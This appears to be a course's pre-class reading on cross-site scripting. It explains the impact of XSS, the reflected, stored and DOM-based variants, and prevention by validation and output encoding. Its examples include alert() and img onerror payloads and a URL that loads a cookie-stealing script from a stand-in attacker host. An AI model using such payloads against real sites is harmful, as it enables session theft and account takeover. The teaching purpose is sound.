Welcome to your introduction to Cross-Site Scripting, universally known as XSS. This is one of the most common and persistent vulnerabilities found in web applications. The goal of this pre-class reading is to provide you with a detailed, foundational understanding of what XSS is, how it works, why it's a significant security risk, and the fundamental principles behind preventing it.

## What is Cross-Site Scripting (XSS)?

![image.png](attachment:63536310-1fb9-4fbe-94e8-0fd5c8a81f79:4c363eb4-49b8-48ee-b881-eebce13ec334.png)

At its core, **Cross-Site Scripting (XSS)** is a security vulnerability that occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to inject malicious scripts (most commonly client-side scripts like JavaScript) into a web page viewed by other users.

Think of a web browser like a very obedient, but naive, personal assistant. When you ask it to visit `example.com`, it fetches all the necessary files (HTML for structure, CSS for style, JavaScript for interactivity) from the `example.com`server. The browser trusts that all these files are authentic and safe. It has no built-in mechanism to distinguish between a legitimate script written by the website's developers and a malicious one slipped in by an attacker. It simply executes all scripts it receives from that trusted source.

XSS exploits this trust. If an attacker can find a way to make a vulnerable web server "serve" or "reflect" their malicious script to a victim's browser, the victim's browser will execute it with the full permissions of the original website.

## The Impact: What Can an Attacker Do?

Once an attacker's script is running in a victim's browser under the origin of a trusted site, it can perform a wide range of malicious actions. The script has access to anything the legitimate front-end code has access to. This includes:

- **Steal Session Cookies:** Session cookies are small pieces of data websites use to remember who you are and keep you logged in. An attacker's script can access these cookies (using `document.cookie` in JavaScript) and send them to a server under their control. With your session cookie, they can impersonate you, bypassing the need for your password to access your account.
- **Capture Keystrokes (Keylogging):** A script can listen for every key you press on a page, capturing sensitive data like usernames, passwords, and credit card numbers _as you type them_, often before you even click "submit."
- **Perform Actions on Behalf of the User:** The script can silently make requests to the website in the background, using your authenticated session. It could change your password, send messages to your contacts, transfer funds in a banking application, or delete critical data.
- **Redirect the User to a Malicious Site:** The script can force the browser to navigate to a different website, such as a convincing phishing page designed to harvest credentials for other services.
- **Deface the Website:** The attacker can alter the content of the web page as seen by the user. This can range from displaying propaganda to inserting fake login forms directly into the trusted website's page to capture credentials.

### Think about it

Consider two scenarios: an attacker stealing your session cookie for a social media site versus your online banking site. Why is the potential impact so different? What specific actions could an attacker take in each case that would cause the most damage? This highlights that the risk of a vulnerability is a combination of its technical severity and the context of the application it affects.

## The Three Main Types of XSS

XSS attacks are categorized based on how the malicious script is stored and delivered to the victim's browser.

### 1. Reflected XSS (Non-Persistent)

![image.png](attachment:cf9a6999-567d-47f0-87c0-a7c557d0a770:image.png)

This is the most common type of XSS. The attacker's malicious script (the "payload") is included as part of the request sent to the web server, typically within a URL parameter. The server-side application then takes this data from the request and includes it in the response page without sanitizing it. The payload is "reflected" off the server to the victim's browser.

For this attack to succeed, the attacker must convince the victim to make the request, usually by clicking a specially crafted link sent via email, chat, or a social media post.

**Example:** A website's search feature is a classic example. A normal search for "reports" might look like this:`https://insecure-website.com/search?query=reports` The page might then display: "Showing results for: **reports**".

A vulnerable application might generate this HTML by taking the `query` parameter directly and inserting it. An attacker could craft a malicious link: `https://insecure-website.com/search?query=<script>alert('XSS Proof of Concept');</script>`

If a victim clicks this link, their browser sends the malicious script to the server. The server includes it in the response page. The victim's browser sees the `<script>` tag as part of the HTML and executes the code inside. While an `alert()`is just a harmless proof-of-concept, a real payload could be far more dangerous: `https://insecure-website.com/search?query=<script src="<https://attacker.com/cookie_stealer.js>"></script>` This would cause the victim's browser to fetch and run a script from the attacker's own server.

### 2. Stored XSS (Persistent)

![image.png](attachment:a58fa0ee-2745-4b88-b23c-321c649f3785:image.png)

Stored XSS is the most potent form of XSS. Here, the attacker's payload is permanently stored on the target application's servers—for instance, in a database. Common injection points include blog comment sections, forum posts, user profile fields (like a username or biography), or product reviews.

The key difference is that the attacker does not need to trick each individual victim. They inject the payload once, and it is automatically served to every user who views the compromised page.

**Example:** A user posts a comment on a popular news article. Instead of plain text, they submit a comment containing a script: `This is a great point! I completely agree. <script>/* malicious code to steal session cookies of anyone viewing this page */</script>`

If the website fails to sanitize this input before storing it in its database, this script is now a permanent part of that article's comment section. Every subsequent visitor who loads the page will receive the malicious script from the trusted server, and their browser will execute it. This is a "one-to-many" attack, making it highly scalable and dangerous.

### 3. DOM-based XSS

DOM-based XSS is a more advanced and subtle variant where the vulnerability exists entirely in the client-side code. The attack payload is never processed by the server; instead, it's the page's own legitimate JavaScript that improperly handles data and writes it into the Document Object Model (DOM), causing the payload to execute.

The **DOM** is the browser's live, structured representation of a web page. JavaScript can read from and write to the DOM to dynamically change what's on the page without needing to reload it.

**Example:** A page allows users to select their language from a dropdown, and the choice is reflected in the URL using a fragment identifier (the part after a `#`). `http://example.com/settings#lang=en`

The page contains a JavaScript snippet to display the currently selected language: `var lang = window.location.hash.substring(6); // Gets "en"` `document.getElementById('selectedLang').innerHTML = "Your language is: " + lang;`

The key here is that the URL fragment (`#lang=en`) is **not** sent to the server in the HTTP request. It's handled purely by the browser. An attacker can craft a URL that abuses this client-side script: `http://example.com/settings#lang=<img src=x onerror=alert('DOM XSS')>`

When a victim visits this URL, the browser's JavaScript will:

1. Read the fragment: `lang` becomes `<img src=x onerror=alert('DOM XSS')>`.
2. Write this value directly into the page's HTML using `.innerHTML`.
3. The browser parses this new HTML, tries to load an image with an invalid source (`src=x`), which fails.
4. The `onerror` event handler is triggered, executing the attacker's `alert()` script.

The server logs would show a clean request for `/settings`, with no trace of the malicious payload.

## Core Prevention Principles

While we will cover defenses in detail during the lesson, it's crucial to be familiar with the two primary strategies for preventing XSS.

1. **Input Validation/Sanitization:** Treat all data from users or external sources as untrusted. Input validation involves creating strict rules for what is considered acceptable data. For example, if you are asking for a user's age, only accept numbers. If you are asking for a US zip code, only accept a 5-digit number. Any input that does not conform to the rules should be rejected. Sanitization is the process of cleaning up the input by removing potentially dangerous characters or code constructs.
2. **Output Encoding:** This is the most critical defense. Before inserting any user-provided data into an HTML page, you must "encode" it. Encoding converts special characters into their safe HTML entity equivalents. For example, the `<` character is converted to `&lt;`. The browser will display the `&lt;` as a literal `<` character on the screen, but it will not interpret it as the start of a new HTML tag. This neutralizes any malicious scripts an attacker tries to inject, rendering them harmless text.

<aside> 📌

The slides for the live session can be viewed here: [https://gamma.app/docs/Module-2-Week-2-Session-3-Cross-Site-Scripting-XSS-edx4gra8mlh73wr?mode=doc](https://gamma.app/docs/Module-2-Week-2-Session-3-Cross-Site-Scripting-XSS-edx4gra8mlh73wr?mode=doc)

Try not to peek before class - spoilers inside!

</aside>